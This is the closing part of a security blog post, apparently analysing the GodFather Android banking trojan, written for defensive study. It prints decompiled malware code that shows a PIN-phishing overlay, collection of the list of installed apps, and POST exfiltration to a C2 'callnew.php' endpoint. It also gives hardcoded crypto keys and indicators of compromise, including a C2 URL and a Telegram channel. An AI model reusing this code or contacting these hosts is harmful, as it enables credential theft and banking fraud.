                        <span class="k">if</span> <span class="o">(</span><span class="n">bedamned</span><span class="o">.</span><span class="na">contains</span><span class="o">(</span><span class="n">effluvias</span><span class="o">))</span> <span class="o">{</span>
                            <span class="nc">Besant</span><span class="o">.</span><span class="na">mismoving</span><span class="o">.</span><span class="na">cancel</span><span class="o">();</span>
                            <span class="n">timerObj</span><span class="o">.</span><span class="na">cancel</span><span class="o">();</span>
                            <span class="nc">Tamarix</span><span class="o">.</span><span class="na">Sandrakottos</span><span class="o">(</span><span class="n">ctx</span><span class="o">,</span> <span class="s">"oph"</span><span class="o">,</span> <span class="n">effluvias</span><span class="o">);</span>
                            <span class="k">return</span><span class="o">;</span>
                        <span class="o">}</span>
                        <span class="nc">Intent</span> <span class="n">dialogIntent</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Intent</span><span class="o">(</span><span class="n">ctx</span><span class="o">,</span> <span class="n">untraffickable</span><span class="o">.</span><span class="na">class</span><span class="o">)</span>
                            <span class="o">.</span><span class="na">putExtra</span><span class="o">(</span><span class="s">"str"</span><span class="o">,</span> <span class="s">"ALL_PIN"</span><span class="o">)</span>
                            <span class="o">.</span><span class="na">putExtra</span><span class="o">(</span><span class="s">"id"</span><span class="o">,</span> <span class="s">"1500"</span><span class="o">);</span>
                        <span class="n">dialogIntent</span><span class="o">.</span><span class="na">addFlags</span><span class="o">(</span><span class="nc">Intent</span><span class="o">.</span><span class="na">FLAG_ACTIVITY_NEW_TASK</span><span class="o">);</span>
                        <span class="n">dialogIntent</span><span class="o">.</span><span class="na">addFlags</span><span class="o">(</span><span class="nc">Intent</span><span class="o">.</span><span class="na">FLAG_ACTIVITY_SINGLE_TOP</span><span class="o">);</span>
                        <span class="n">dialogIntent</span><span class="o">.</span><span class="na">addFlags</span><span class="o">(</span><span class="nc">Intent</span><span class="o">.</span><span class="na">FLAG_ACTIVITY_CLEAR_TOP</span><span class="o">);</span>
                        <span class="n">ctx</span><span class="o">.</span><span class="na">startActivity</span><span class="o">(</span><span class="n">dialogIntent</span><span class="o">);</span>
                    <span class="o">}</span>
                <span class="o">}</span>
            <span class="o">};</span>
            <span class="n">mismoving</span> <span class="o">=</span> <span class="n">timerTask</span><span class="o">;</span>
            <span class="n">timerObj</span><span class="o">.</span><span class="na">schedule</span><span class="o">(</span><span class="n">timerTask</span><span class="o">,</span> <span class="mi">0L</span><span class="o">,</span> <span class="mi">2000L</span><span class="o">);</span>
        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="nc">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
        <span class="o">}</span>
    <span class="o">}</span>
<span class="o">}</span>

</code></pre></div></div>

<p><img src="/assets/images/2024-12-09-godfather-android-analysis/img24.png" alt="Figure 24 - Shared Preference Example" /></p>

<h4 id="osnabruck">Osnabruck</h4>

<p><img src="/assets/images/2024-12-09-godfather-android-analysis/img25.png" alt="Figure 25 - Osnabruck Class" /></p>

<p>In this function a “bowfin” string is initialized with the value, representing an empty string or URL escape character.
A loop is run through the list of installed applications obtained through the PackageManager.
For each PackageInfo in the list:</p>
<ol>
  <li>If the Flag_System flag of the application is disable (indicating that the application is non-system),</li>
  <li>the application package name is added to the bowfin string, followed by |||.
At the end, the bowfin string is passed to the Sandrakottos function.</li>
</ol>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
   <span class="kd">public</span> <span class="kd">static</span> <span class="nc">String</span> <span class="nf">Osnabruck</span><span class="o">(</span><span class="nc">Context</span> <span class="n">context</span><span class="o">)</span> <span class="o">{</span>
        <span class="n">bowfin</span> <span class="o">=</span> <span class="nc">HttpUrl</span><span class="o">.</span><span class="na">FRAGMENT_ENCODE_SET</span><span class="o">;</span>
        <span class="k">try</span> <span class="o">{</span>
            <span class="nc">List</span><span class="o">&lt;</span><span class="nc">PackageInfo</span><span class="o">&gt;</span> <span class="n">b</span> <span class="o">=</span> <span class="n">context</span><span class="o">.</span><span class="na">getPackageManager</span><span class="o">().</span><span class="na">getInstalledPackages</span><span class="o">(</span><span class="mi">0</span><span class="o">);</span>
            <span class="k">for</span> <span class="o">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">b</span><span class="o">.</span><span class="na">size</span><span class="o">();</span> <span class="n">i</span><span class="o">++)</span> <span class="o">{</span>
                <span class="nc">PackageInfo</span> <span class="n">p</span> <span class="o">=</span> <span class="n">b</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">i</span><span class="o">);</span>
                <span class="nc">ApplicationInfo</span> <span class="n">applicationInfo</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="na">applicationInfo</span><span class="o">;</span>
                <span class="k">if</span> <span class="o">((</span><span class="n">applicationInfo</span><span class="o">.</span><span class="na">flags</span> <span class="o">&amp;</span> <span class="mi">1</span><span class="o">)</span> <span class="o">==</span> <span class="mi">0</span><span class="o">)</span> <span class="o">{</span>
                    <span class="nc">String</span> <span class="n">a</span> <span class="o">=</span> <span class="n">applicationInfo</span><span class="o">.</span><span class="na">packageName</span><span class="o">;</span>
                    <span class="n">bowfin</span> <span class="o">+=</span> <span class="n">a</span> <span class="o">+</span> <span class="o">(</span><span class="s">"|||"</span><span class="o">);</span>
                <span class="o">}</span>
            <span class="o">}</span>
            <span class="nc">Tamarix</span><span class="o">.</span><span class="na">Sandrakottos</span><span class="o">(</span><span class="n">context</span><span class="o">,</span> <span class="o">(</span><span class="s">"alt"</span><span class="o">),</span> <span class="n">bowfin</span><span class="o">);</span>
        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="nc">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
        <span class="o">}</span>
        <span class="k">return</span> <span class="n">bowfin</span><span class="o">;</span>
    <span class="o">}</span>


</code></pre></div></div>

<p>Tamarix.Sandrakottos(context, (“alt”), bowfin);</p>

<p>In the shared preference we can see:</p>

<p><img src="/assets/images/2024-12-09-godfather-android-analysis/img26.png" alt="Figure 26 - Empty Shared Preference Example" /></p>

<p>That is because we use a New Emulator with no application installed.</p>

<h4 id="malacostraca">Malacostraca</h4>

<p><img src="/assets/images/2024-12-09-godfather-android-analysis/img27.png" alt="Figure 27 - Malacostraca Class" /></p>

<p>This function retrieves the value associated with the key “ky” from the SharedPreference.</p>

<p>It Inserts an addition parameter with key “ick” and value “true” into the params map,</p>

<p>retrieves the value associated with key “min” from the shared preferences using the bedamned method.</p>

<p>After that it passes the retrived value to the Uriiah function to obtain the base URL.</p>

<p>Adds “call.php” to the obtained base url.</p>

<p>Call undissuadably method to perform an HTTP POST request to this URL with the params.</p>

<p><img src="/assets/images/2024-12-09-godfather-android-analysis/img28.png" alt="Figure 28 - Request Http" /></p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">Malacostraca</span><span class="o">(</span><span class="nc">Context</span> <span class="n">context</span><span class="o">)</span> <span class="o">{</span>
    <span class="nc">String</span> <span class="n">effluvias</span> <span class="o">=</span> <span class="s">"ky"</span><span class="o">;</span>
    <span class="k">try</span> <span class="o">{</span>
        <span class="nc">HashMap</span><span class="o">&lt;</span><span class="nc">String</span><span class="o">,</span> <span class="nc">String</span><span class="o">&gt;</span> <span class="n">params</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">HashMap</span><span class="o">&lt;&gt;();</span>
        
        <span class="n">params</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="n">effluvias</span><span class="o">,</span> <span class="n">bedamned</span><span class="o">(</span><span class="n">context</span><span class="o">,</span> <span class="n">effluvias</span><span class="o">));</span>
        
        <span class="n">params</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">"ick"</span><span class="o">,</span> <span class="s">"true"</span><span class="o">);</span>
        
        <span class="nc">String</span> <span class="n">url</span> <span class="o">=</span> <span class="nc">Uriiah</span><span class="o">(</span><span class="n">bedamned</span><span class="o">(</span><span class="n">context</span><span class="o">,</span> <span class="s">"min"</span><span class="o">))</span> <span class="o">+</span> <span class="s">"callnew.php"</span><span class="o">;</span>
        
        <span class="n">veepees</span><span class="o">.</span><span class="na">undissuadably</span><span class="o">(</span><span class="n">context</span><span class="o">,</span> <span class="n">url</span><span class="o">,</span> <span class="n">params</span><span class="o">);</span>
    <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="nc">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
    <span class="o">}</span>
<span class="o">}</span>

</code></pre></div></div>

<h2 id="conclusion">Conclusion</h2>

<p>Analysis of some of GodFather’s features provided insight into its capabilities and operation.<br />
Here are the key points that emerged from our analysis:</p>

<p>•   C2 communication: GodFather uses encrypted communication with the command-and-control server to send stolen data and receive commands. This two-way channel allows attackers to manage the infection in real time, updating the malware with new instructions or exfiltrating additional data without raising suspicion. 
•   Using Shared Preferences: The malware exploits Android’s Shared Preferences to store critical information, such as login details or temporary keys. This technique allows GodFather to retain data even after a device reboot, maintaining persistence and making it easier to retrieve the information for later use.</p>

<h2 id="indicator-of-compromise">Indicator of Compromise</h2>

<table>
  <tbody>
    <tr>
      <td>App Name</td>
      <td>Chrome.apk</td>
    </tr>
    <tr>
      <td>Package Name</td>
      <td>com.melting.mantaught</td>
    </tr>
    <tr>
      <td>Sha256</td>
      <td>20116083565a50f6b2db59011e9994e9a9f5db5994703d53233b8b202a5ad2f3</td>
    </tr>
    <tr>
      <td>Telegram Channel</td>
      <td>https://t.me/famokorapisoram</td>
    </tr>
    <tr>
      <td>C2 Server</td>
      <td>https://yukoramparata.top/zamra/aaa/</td>
    </tr>
  </tbody>
</table>

<h2 id="list-of-quick-reference-of-function">List of quick reference of function</h2>

<table>
  <thead>
    <tr>
      <th>Function Name</th>
      <th>Description</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>cirrofilum.effluvias</td>
      <td>Decipher Strings</td>
    </tr>
    <tr>
      <td>Sandrakottos</td>
      <td>Write data inside the SharedPreference</td>
    </tr>
    <tr>
      <td>bedamned</td>
      <td>Retrive data from SharedPreference</td>
    </tr>
    <tr>
      <td>champaka</td>
      <td>Generate random string</td>
    </tr>
    <tr>
      <td>undissuadably</td>
      <td>Use OkHttp to mke a request and then process the http response and save it in the sharepreference</td>
    </tr>
    <tr>
      <td>hagiography</td>
      <td>Decode a string into Base64</td>
    </tr>
    <tr>
      <td>Uriiah</td>
      <td>Deciphering with blowfish, SecretKeySpec “ABC”</td>
    </tr>
    <tr>
      <td>samariums</td>
      <td>Takes a string in b64 and decoding it with an algorithm</td>
    </tr>
    <tr>
      <td>hexammine</td>
      <td>Send data to a remote server</td>
    </tr>
    <tr>
      <td>rarefeatured</td>
      <td>Prepares to send a request http</td>
    </tr>
    <tr>
      <td>gnarliness</td>
      <td>Takes a string in input, converts it to a byte array using UTF-8 encoding and then econdes the byte array in Base64, return the string as result</td>
    </tr>
    <tr>
      <td>trochanteric</td>
      <td>Converts an array of bytes into a hexadecimal string</td>
    </tr>
    <tr>
      <td>crakow</td>
      <td>Ensure that the lenght of string “s” is a multiple of 16 by adding null characters to the end of the string if necessary</td>
    </tr>
    <tr>
      <td>Predicator</td>
      <td>Function where an IV (sulphuric) is initialized using a fixed sequence of hexadecimal characters (“fedcba9876543210”). A secret key (potlatching) is created for the AES algorighm using a fix sequence of hexadecimal characters (“0123456789abcdef”).</td>
    </tr>
    <tr>
      <td>Spellican</td>
      <td>Executes an Http Get request to a specified URL, parses the HTML response to find a specific metatag and then stores the contents of that tag in the Android SharedPreferences</td>
    </tr>
    <tr>
      <td>Malacostraca</td>
      <td>Function that exectues ab Http Post request with certain parameters and URL, using methods to support for Recover values and build demand</td>
    </tr>
    <tr>
      <td>Abourezk</td>
      <td>Function that checks whether the app has permission to ignore battery optimization and, if it does not, request that permission. Once permission is obtained, it opens a specific URL in the chrome browser</td>
    </tr>
    <tr>
      <td>JJ</td>
      <td>Function that determines a code based on the manufacturer and model of the Android device it is running on, and then uses the Sandrakottos method of the Tamarix class to send this code along with the “device” key</td>
    </tr>
    <tr>
      <td>speculated</td>
      <td>Function that checks whether the device is locked. If it is not, it initiates a periodic action that checks a specific condition in the shared preferences and, if satisfied, cancels the timer and logs the event.</td>
    </tr>
    <tr>
      <td>untraffickable</td>
      <td>Function that primarily handles the display of a Web page in a WebView, with specific configurations based on values obtained from methods in other classes (Tamarix and cirrofilum).</td>
    </tr>
    <tr>
      <td>Osnabruck</td>
      <td>Function that returns a string containing the package names of the non-system applications installed on the Android device and writes this info to the sharedpreferences</td>
    </tr>
    <tr>
      <td>supersincerity</td>
      <td>The function configures various parameters in the context of the application based on default values and the default language of the device.</td>
    </tr>
    <tr>
      <td>Champaka</td>
      <td>Creates a random string used for “ky” of sharedpreferences</td>
    </tr>
  </tbody>
</table>

<h2 id="shared-preference-unmask">Shared Preference Unmask</h2>

<p>The following is a version of app.xml with an explanation of the main fields and the functions that go into interacting with them.</p>

<p>https://github.com/phemt91/GodFather_String/blob/main/Shared%20Preference%20Details</p>


        
      </section>

      <footer class="page__meta">
        
        


        

  <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time class="dt-published" datetime="2024-12-10T00:00:00+00:00">December 10, 2024</time></p>

      </footer>

      

      
    </div>

    
  </article>

  
  
</div>

      
    </div>

    

    <div id="footer" class="page__footer">
      <footer>
        <!-- start custom footer snippets -->

<!-- end custom footer snippets -->
        <div class="page__footer-follow">
  <ul class="social-icons">
    

    

    
      <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
    
  </ul>
</div>

<div class="page__footer-copyright">&copy; 2024 <a href="https://ph3mt.github.io/">Ph3mt Blog</a>. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/minimal-mistakes-jekyll-theme/" rel="nofollow">Minimal Mistakes</a>.</div>

      </footer>
    </div>

    
  <script src="/assets/js/main.min.js"></script>









  </body>
</html>
